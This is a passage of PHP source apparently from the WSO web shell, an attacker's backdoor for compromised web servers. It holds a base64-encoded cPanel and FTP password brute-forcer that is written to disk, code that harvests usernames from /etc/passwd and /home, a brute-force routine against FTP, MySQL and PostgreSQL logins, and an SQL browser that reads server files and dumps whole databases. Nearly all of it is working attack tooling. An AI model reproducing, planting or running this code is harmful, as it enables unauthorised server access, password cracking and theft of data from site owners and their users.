iAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgKCRtYXggKyAxKTsgJGkrKykgew0KICAgICAgICAgICAgaWYgKCRBWyRpXSA9PSAtMSkgew0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRpLS07DQogICAgICAgICRpbmNEb25lID0gMDsNCiAgICAgICAgd2hpbGUgKCEkaW5jRG9uZSkgeyAgICANCiAgICAgICAgICAgIGZvciAoJGogPSAwOyAkaiA8ICRudW1WYWxzOyAkaisrKSB7DQogICAgICAgICAgICAgICAgaWYgKCRBWyRpXSA9PSAkdmFsc1skal0pIHsNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRqID09ICgkbnVtVmFscyAtIDEpKSB7DQogICAgICAgICAgICAgICAgJEFbJGldID0gJHZhbHNbMF07DQogICAgICAgICAgICAgICAgJGktLTsNCiAgICAgICAgICAgICAgICBpZiAoJGkgPCAwKSB7DQogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICgkbWF4ICsgMSk7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQVskaV0gPT0gLTEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkQVskaV0gPSAkdmFsc1swXTsNCiAgICAgICAgICAgICAgICAgICAgJEFbJGkgKyAxXSA9IC0xOw0KICAgICAgICAgICAgICAgICAgICAkaW5jRG9uZSA9IDE7DQogICAgICAgICAgICAgICAgICAgIHByaW50ICJTdGFydGluZyAiIC4gKHN0cmxlbigkY3VycmVudFZhbCkgKyAxKSAuICIgQ2hhcmFjdGVycyBDcmFja2luZzxicj4iOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJEFbJGldID0gJHZhbHNbJGogKyAxXTsNCiAgICAgICAgICAgICAgICAkaW5jRG9uZSA9IDE7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJGkgPSAwOw0KICAgICAgICAkY3VycmVudFZhbCA9ICIiOw0KICAgICAgICB3aGlsZSAoJEFbJGldICE9IC0xKSB7DQogICAgICAgICAgICAkY3VycmVudFZhbCA9ICRjdXJyZW50VmFsIC4gJEFbJGldOw0KICAgICAgICAgICAgJGkrKzsNCiAgICAgICAgfQ0KICAgICAgICBjcGFuZWxfY2hlY2soJHRhcmdldCwkcHVyZXVzZXIsJGN1cnJlbnRWYWwsJGNvbm5lY3RfdGltZW91dCk7DQogICAgICAgIC8vZWNobyAkY3VycmVudFZhbCAuICI8YnI+IjsNCiAgICAgICAgaWYgKCRjdXJyZW50VmFsID09ICRyZWFsTWF4KSB7DQogICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgfQ0KICAgIH0NCn0NCmZ1bmN0aW9uIGdldG1pY3JvdGltZSgpIHsNCiAgIGxpc3QoJHVzZWMsICRzZWMpID0gZXhwbG9kZSgiICIsbWljcm90aW1lKCkpOw0KICAgcmV0dXJuICgoZmxvYXQpJHVzZWMgKyAoZmxvYXQpJHNlYyk7DQp9IA0KDQpmdW5jdGlvbiBmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpDQp7DQogJGNoID0gY3VybF9pbml0KCk7DQogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImZ0cDovLyRob3N0Iik7DQogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSFRUUEFVVEgsIENVUkxBVVRIX0JBU0lDKTsNCiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRlRQTElTVE9OTFksIDEpOw0KIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSUFdELCAiJHVzZXI6JHBhc3MiKTsNCiBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAkdGltZW91dCk7DQogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAxKTsNCiAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOw0KIGlmICggY3VybF9lcnJubygkY2gpID09IDI4ICkNCiB7DQogcHJpbnQgIjxiPjxmb250IGZhY2U9XCJWZXJkYW5hXCIgc3R5bGU9XCJmb250LXNpemU6IDlwdFwiPg0KIDxmb250IGNvbG9yPVwiI0FBMDAwMFwiPkVycm9yIDo8L2ZvbnQ+IDxmb250IGNvbG9yPVwiIzAwODAwMFwiPkNvbm5lY3Rpb24gVGltZW91dA0KIFBsZWFzZSBDaGVjayBUaGUgVGFyZ2V0IEhvc3RuYW1lIC48L2ZvbnQ+PC9mb250PjwvYj48L3A+IjtleGl0Ow0KIH0NCiBlbHNlIGlmICggY3VybF9lcnJubygkY2gpID09IDAgKQ0KIHsNCiAgcHJpbnQgIjxiPjxmb250IGZhY2U9XCJUYWhvbWFcIiBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjMDA4MDAwXCI+W35dPC9mb250PjwvYj48Zm9udCBmYWNlPVwiVGFob21hXCIgICBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCI+PGI+PGZvbnQgY29sb3I9XCIjMDA4MDAwXCI+DQogQ3JhY2tpbmcgU3VjY2VzcyBXaXRoIFVzZXJuYW1lICZxdW90OzwvZm9udD48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj4kdXNlcjwvZm9udD48Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj5cIg0KIGFuZCBQYXNzd29yZCBcIjwvZm9udD48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj4kcGFzczwvZm9udD48Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj5cIjwvZm9udD48L2I+PGJyPjxicj4iOw0KIH0NCiBjdXJsX2Nsb3NlKCRjaCk7DQp9DQpmdW5jdGlvbiBjcGFuZWxfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpDQp7DQogZ2xvYmFsICRjcGFuZWxfcG9ydDsNCiAkY2ggPSBjdXJsX2luaXQoKTsNCiAvL2VjaG8gImh0dHA6Ly8kaG9zdDoiLiRjcGFuZWxfcG9ydC4iICR1c2VyICRwYXNzPGJyPiI7DQogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHA6Ly8kaG9zdDoiIC4gJGNwYW5lbF9wb3J0KTsNCiBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQQVVUSCwgQ1VSTEFVVEhfQkFTSUMpOw0KIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSUFdELCAiJHVzZXI6JHBhc3MiKTsNCiBjdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAkdGltZW91dCk7DQogY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZBSUxPTkVSUk9SLCAxKTsNCiAkZGF0YSA9IGN1cmxfZXhlYygkY2gpOw0KIGlmICggY3VybF9lcnJubygkY2gpID09IDI4ICkNCiB7DQogIHByaW50ICI8Yj48Zm9udCBmYWNlPVwiVmVyZGFuYVwiIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIj4NCiAgPGZvbnQgY29sb3I9XCIjQUEwMDAwXCI+RXJyb3IgOjwvZm9udD4gPGZvbnQgY29sb3I9XCIjMDA4MDAwXCI+Q29ubmVjdGlvbiBUaW1lb3V0DQogIFBsZWFzZSBDaGVjayBUaGUgVGFyZ2V0IEhvc3RuYW1lIC48L2ZvbnQ+PC9mb250PjwvYj48L3A+IjtleGl0Ow0KIH0NCiBlbHNlIGlmICggY3VybF9lcnJubygkY2gpID09IDAgKQ0KIHsNCiAgcHJpbnQgIjxiPjxmb250IGZhY2U9XCJUYWhvbWFcIiBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjMDA4MDAwXCI+W35dPC9mb250PjwvYj48Zm9udCBmYWNlPVwiVGFob21hXCIgICBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCI+PGI+PGZvbnQgY29sb3I9XCIjMDA4MDAwXCI+IA0KICBDcmFja2luZyBTdWNjZXNzIFdpdGggVXNlcm5hbWUgJnF1b3Q7PC9mb250Pjxmb250IGNvbG9yPVwiI0ZGMDAwMFwiPiR1c2VyPC9mb250Pjxmb250IGNvbG9yPVwiIzAwODAwMFwiPlwiDQogIGFuZCBQYXNzd29yZCBcIjwvZm9udD48Zm9udCBjb2xvcj1cIiNGRjAwMDBcIj4kcGFzczwvZm9udD48Zm9udCBjb2xvcj1cIiMwMDgwMDBcIj5cIjwvZm9udD48L2I+PGJyPjxicj4iOw0KIH0NCiBjdXJsX2Nsb3NlKCRjaCk7DQp9DQoNCiR0aW1lX3N0YXJ0ID0gZ2V0bWljcm90aW1lKCk7DQoNCmlmKGlzc2V0KCRzdWJtaXQpICYmICFlbXB0eSgkc3VibWl0KSkNCnsNCiBpZihlbXB0eSgkdXNlcnMpICYmIGVtcHR5KCRwYXNzKSApDQogew0KICAgcHJpbnQgIjxwPjxmb250IGZhY2U9XCJUYWhvbWFcIiBzaXplPVwiMlwiPjxiPjxmb250IGNvbG9yPVwiI0ZGMDAwMFwiPkVycm9yIDogPC9mb250PlBsZWFzZSBDaGVjayBUaGUgVXNlcnMgb3IgUGFzc3dvcmQgTGlzdCBFbnRyeSAuIC4gLjwvYj48L2ZvbnQ+PC9wPiI7IGV4aXQ7IH0NCiBpZihlbXB0eSgkdXNlcnMpKXsgcHJpbnQgIjxwPjxmb250IGZhY2U9J1RhaG9tYScgc2l6ZT0nMic+PGI+PGZvbnQgY29sb3I9JyNGRjAwMDAnPkVycm9yIDogPC9mb250PlBsZWFzZSBDaGVjayBUaGUgVXNlcnMgTGlzdCBFbnRyeSAuIC4gLjwvYj48L2ZvbnQ+PC9wPiI7IGV4aXQ7IH0NCiBpZihlbXB0eSgkcGFzcykgJiYgJF9SRVFVRVNUWydicnV0ZWZvcmNlJ10hPSJ0cnVlIiApeyBwcmludCAiPHA+PGZvbnQgZmFjZT0nVGFob21hJyBzaXplPScyJz48Yj48Zm9udCBjb2xvcj0nI0ZGMDAwMCc+RXJyb3IgOiA8L2ZvbnQ+UGxlYXNlIENoZWNrIFRoZSBQYXNzd29yZCBMaXN0IEVudHJ5IC4gLiAuPC9iPjwvZm9udD48L3A+IjsgZXhpdDsgfTsNCiAkdXNlcmxpc3Q9ZXhwbG9kZSgiXG4iLCR1c2Vycyk7DQogJHBhc3NsaXN0PWV4cGxvZGUoIlxuIiwkcGFzcyk7DQogcHJpbnQgIjxiPjxmb250IGZhY2U9XCJUYWhvbWFcIiBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjMDA4MDAwXCI+W35dIzwvZm9udD48Zm9udCBmYWNlPVwiVGFob21hXCIgc3R5bGU9XCJmb250LXNpemU6IDlwdFwiIGNvbG9yPVwiI0ZGMDAwMFwiPg0KIENyYWNraW5nIFByb2Nlc3MgU3RhcnRlZCwgUGxlYXNlIFdhaXQgLi4uPC9mb250PjwvYj48YnI+PGJyPiI7DQoNCiBpZihpc3NldCgkX1BPU1RbJ2Nvbm5lY3RfdGltZW91dCddKSkNCiB7DQogICRjb25uZWN0X3RpbWVvdXQ9JF9QT1NUWydjb25uZWN0X3RpbWVvdXQnXTsNCiB9DQoNCiBpZigkY3JhY2t0eXBlID09ICJmdHAiKQ0KIHsNCiAgZm9yZWFjaCAoJHVzZXJsaXN0IGFzICR1c2VyKSANCiAgew0KICAgJHB1cmV1c2VyID0gdHJpbSgkdXNlcik7DQogICBmb3JlYWNoICgkcGFzc2xpc3QgYXMgJHBhc3N3b3JkICkgDQogICB7DQogICAgICRwdXJlcGFzcyA9IHRyaW0oJHBhc3N3b3JkKTsNCiAgICAgZnRwX2NoZWNrKCR0YXJnZXQsJHB1cmV1c2VyLCRwdXJlcGFzcywkY29ubmVjdF90aW1lb3V0KTsNCiAgIH0NCiAgfQ0KIH0NCiANCiBpZiAoJGNyYWNrdHlwZSA9PSAiY3BhbmVsIiB8fCAkY3JhY2t0eXBlID09ICJjcGFuZWwyIikNCiB7DQogIGlmKCRjcmFja3R5cGUgPT0gImNwYW5lbDIiKQ0KICB7DQogICAkY3BhbmVsX3BvcnQ9IjIzIjsNCiAgfQ0KICBlbHNlDQogICAkY3BhbmVsX3BvcnQ9IjIwODIiOw0KICANCiAgZm9yZWFjaCAoJHVzZXJsaXN0IGFzICR1c2VyKSANCiAgew0KICAgJHB1cmV1c2VyID0gdHJpbSgkdXNlcik7DQogICBwcmludCAiPGI+PGZvbnQgZmFjZT1cIlRhaG9tYVwiIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIiBjb2xvcj1cIiMwMDgwMDBcIj5bfl0jPC9mb250Pjxmb250IGZhY2U9XCJUYWhvbWFcIiAgc3R5bGU9XCJmb250LXNpemU6IDlwdFwiIGNvbG9yPVwiI0ZGMDgwMFwiPg0KICAgUHJvY2Vzc2luZyB1c2VyICRwdXJldXNlciAuLi4gPC9mb250PjwvYj4iOw0KICAgaWYoJF9QT1NUWydicnV0ZWZvcmNlJ109PSJ0cnVlIikNCiAgIHsNCiAgICBlY2hvICIgYnJ1dGVmb3JjaW5nIC4uIjsNCiAgICBlY2hvICI8YnI+IjsNCiAgICBicnV0ZSgpOw0KICAgfQ0KICAgZWxzZQ0KICAgew0KICAgICBlY2hvICI8YnI+IjsgDQogICAgIGZvcmVhY2ggKCRwYXNzbGlzdCBhcyAkcGFzc3dvcmQgKSANCiAgICAgew0KICAgICAgICRwdXJlcGFzcyA9IHRyaW0oJHBhc3N3b3JkKTsNCiAgICAgICBjcGFuZWxfY2hlY2soJHRhcmdldCwkcHVyZXVzZXIsJHB1cmVwYXNzLCRjb25uZWN0X3RpbWVvdXQpOw0KICAgICB9DQogICB9DQogIH0NCiAgJHRpbWVfZW5kID0gZ2V0bWljcm90aW1lKCk7DQokdGltZSA9ICR0aW1lX2VuZCAtICR0aW1lX3N0YXJ0OyANCiBwcmludCAiPGI+PGZvbnQgZmFjZT1cIlRhaG9tYVwiIHN0eWxlPVwiZm9udC1zaXplOiA5cHRcIiBjb2xvcj1cIiMwMDgwMDBcIj5bfl0jPC9mb250Pjxmb250IGZhY2U9XCJUYWhvbWFcIiBzdHlsZT1cImZvbnQtc2l6ZTogOXB0XCIgY29sb3I9XCIjRkYwMDAwXCI+DQogQ3JhY2tpbmcgRmluaXNoZWQuIEVsYXBzZWQgdGltZTogJHRpbWU8L2ZvbnQ+IHNlY29uZHM8L2I+PGJyPjxicj4iOw0KICB9DQp9DQoNCg0KDQo/Pg0KDQoNCg0KICAgICAgPGZvcm0gc3R5bGU9ImJvcmRlcjogMHB4IHJpZGdlICNGRkZGRkYiPg0KDQoNCg0KDQogICAgPHAgYWxpZ249ImNlbnRlciI+PC90ZD4NCiAgPC90cj48ZGl2IGFsaWduPSJjZW50ZXIiPg0KDQogICAgICAgICAgICAgICAgPHRyPg0KDQo8L2Zvcm0+DQoNCg0KPGRpdiBhbGlnbj0iY2VudGVyIj4NCiA8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAlIiBib3JkZXJjb2xvcmxpZ2h0PSIjMDA4MDAwIiBib3JkZXJjb2xvcmRhcms9IiMwMDZBMDAiIGhlaWdodD0iMTAwIiBjZWxsc3BhY2luZz0iMSI+DQo8dHI+DQo8dGQgYm9yZGVyY29sb3JsaWdodD0iIzAwODAwMCIgYm9yZGVyY29sb3JkYXJrPSIjMDA2QTAwIj4NCjxwIGFsaWduPSJsZWZ0Ij4NCjx0ZXh0YXJlYSBzdHlsZT0iYm9yZGVyOiAycHggc29saWQgIzFEMUQxRDtiYWNrZ3JvdW5kOiAjMjAwMDAwO2NvbG9yOiNDQ0ZGRkYiIG1ldGhvZD0nUE9TVCcgcm93cz0iMjUiIG5hbWU9IlMxIiBjb2xzPSIyMiI+DQoNCg0KPD9waHANCiAgIGlmIChpc3NldCgkX0dFVFsndXNlciddKSkNCiAgICAgIHN5c3RlbSgnbHMgL3Zhci9tYWlsJyk7IA0KICAgaWYgKGlzc2V0KCRfUE9TVFsnZ3JhYl91c2VyczEnXSkpIC8vZ3JhYiB1c2VycyBmcm9tIC9ldGMvcGFzc3dkDQogICB7DQogICAgICAkbGluZXM9ZmlsZSgiL2V0Yy9wYXNzd2QiKTsNCiAgICAgIGZvcmVhY2goJGxpbmVzIGFzICRucj0+JHZhbCkNCiAgICAgIHsNCiAgICAgICAkc3RyPWV4cGxvZGUoIjoiLCR2YWwpOw0KICAgICAgIGVjaG8gJHN0clswXS4iXG4iOw0KICAgICAgfQ0KICAgICANCiAgIH0NCiAgIGlmIChpc3NldCgkX1BPU1RbJ2dyYWJfdXNlcnMyJ10pKQ0KICAgIHsNCiAgICAgJGRpciA9ICIvaG9tZS8iOw0KICAgICBpZiAoJGRoID0gb3BlbmRpcigkZGlyKSkgew0KICAgICAgICB3aGlsZSAoKCRmaWxlID0gcmVhZGRpcigkZGgpKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgIGVjaG8gJGZpbGUuICJcbiI7DQogICAgICAgIH0NCiAgICAgICAgICAgIGNsb3NlZGlyKCRkaCk7DQogICAgICAgIH0NCiAgICB9DQo/Pg0KPC90ZXh0YXJlYT4NCjx0YWJsZT4NCjx0cj4NCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9InRydWUiIG5hbWU9ImdyYWJfdXNlcnMxIj48L2lucHV0Pg0KPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJHcmFiIFVzZXJuYW1lcyBmcm9tIC9ldGMvcGFzc3dkIj48L2lucHV0Pg0KPC9mb3JtPg0KPC90cj4NCjxicj4NCjx0cj4NCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgdmFsdWU9InRydWUiIG5hbWU9ImdyYWJfdXNlcnMyIj48L2lucHV0Pg0KPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSJHcmFiIFVzZXJuYW1lcyBmcm9tIC9ob21lLyI+PC9pbnB1dD4NCjwvZm9ybT4NCjwvdHI+DQo8YnI+DQo8dHI+DQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJQT1NUIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIHZhbHVlPSJ0cnVlIiBuYW1lPSJncmFiX3VzZXJzMyI+PC9pbnB1dD4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iR3JhYiBVc2VybmFtZXMgZnJvbSAvaG9tZS8gSUkiPjwvaW5wdXQ+DQo8L2Zvcm0+DQo8L3RyPg0KPC9mb3JtPg0KPC90YWJsZT4NCjw/cGhwDQppZiAoaXNzZXQoJF9QT1NUWydncmFiX3VzZXJzMyddKSkNCiAgICB7DQogICAgICAgIGVycm9yX3JlcG9ydGluZygwKTsNCiAgICAgJGRpciA9ICIvaG9tZS8iOw0KICAgICBpZiAoJGRoID0gb3BlbmRpcigkZGlyKSkgDQogICAgIHsNCiAgICAgICAgJGYgPSByZWFkZGlyKCRkaCk7JGYgPSByZWFkZGlyKCRkaCk7DQogICAgICAgIHdoaWxlICgoJGYgPSByZWFkZGlyKCRkaCkpICE9PSBmYWxzZSkgDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vZWNobyAkZi4gIlxuIjsNCiAgICAgICAgICAgICRmLj0iLyI7DQogICAgICAgICAgICAkZGgyPW9wZW5kaXIoJGRpci4kZik7DQogICAgICAgICAgICAkZjIgPSByZWFkZGlyKCRkaDIpOyRmMiA9IHJlYWRkaXIoJGRoMik7DQogICAgICAgICAgICB3aGlsZSAoKCRmMiA9IHJlYWRkaXIoJGRoMikpICE9PSBmYWxzZSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgLy9lY2hvICRmMi4gIlxuIjsNCiAgICAgICAgICAgICAkZjIuPSIvIjsNCiAgICAgICAgICAgICAkZGgzPW9wZW5kaXIoJGRpci4kZi4kZjIpOw0KICAgICAgICAgICAgICRmMyA9IHJlYWRkaXIoJGRoMyk7JGYzID0gcmVhZGRpcigkZGgzKTsNCiAgICAgICAgICAgICB3aGlsZSAoKCRmMyA9IHJlYWRkaXIoJGRoMykpICE9PSBmYWxzZSkgDQogICAgICAgICAgICAgew0KICAgICAgICAgICAgICBlY2hvICRmMy4gIjxicj4iOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICB9DQogICAgICAgICAgICBjbG9zZWRpcigkZGgpOw0KICAgICB9DQogICAgfQ0KPz4g');
$write = fwrite ($file ,$sa);
fclose($file);

	
	
	
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>'
		.'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>'
		.'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="root"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr>';
		echo '<tr><td><b><a href=/dkcpanel.php>CpanelBruterv1.0</a><br></tr></form></table>';
	echo '</div><br>';
	
	wsoFooter();
}

function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = @mysql_list_dbs($this->link);
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_shadow'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error($this->link);
				break;
				case 'pgsql':
					return @pg_last_error($this->link);
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this->type)	{
				case 'mysql':
					return $this->fetch($this->query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this->fetch())
						$r[] = $i['file'];
					$this->query('drop table wso2');
					return array('file'=>implode("
",$r));
				break;
			}
			return false;
		}
		function dump($table) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					echo $create[1].";

";
					$this->query('SELECT * FROM `'.$table.'`');
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
					echo 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."
";
					}
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
					echo 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."
";
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		ob_start("ob_gzhandler", 4096);
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
		header("Content-Disposition: attachment; filename=dump.sql");
		header("Content-Type: text/plain");
		foreach($_POST['tbl'] as $v)
				$db->dump($v);
		exit;
	}
	wsoHeader();
	echo "
<h1>Sql browser</h1><div class=content>
<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select name='type'><option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo ">PostgreSql</option></select></td>
<td><input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
<td><input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'></td>
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
